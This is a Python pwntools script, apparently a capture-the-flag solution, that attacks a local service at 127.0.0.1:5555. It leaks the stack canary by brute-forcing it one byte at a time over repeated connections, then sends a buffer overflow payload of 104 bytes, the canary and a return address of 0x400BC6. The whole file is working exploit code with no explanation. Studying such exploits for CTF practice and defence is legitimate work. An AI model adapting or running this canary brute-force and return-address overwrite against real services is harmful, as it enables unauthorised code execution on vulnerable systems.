




# python3 


from pwn import *

context(arch="amd64", os="linux")
debug = 1

if debug:
    context.log_level="debug"
    context.terminal = ['tmux', 'splitw', '-h']

url = '127.0.0.1'
port = '5555'


def leak_canary():
    global canary
    canary = b'\x00'
    while len(canary) < 8:
        for i in range(255):
            test = b'A' * 104 + canary + i.to_bytes(1, byteorder='big')
            io = remote(url, port)
            io.recv()
            io.send(test)

            try:
                io.recv()
                canary += i.to_bytes(1, byteorder='big')
                break
            except:
                continue
            finally:
                io.close()
    log.info('leak canary: 0x%s'% canary)

def doit():
    io = remote(url, port)
    io.recv()

    payload = b'A' * 104 + canary + b'A' * 8 + p64(0x400BC6)
    io.send(payload)
    print( io.recv() )


if __name__ == '__main__':
    leak_canary()
    doit()

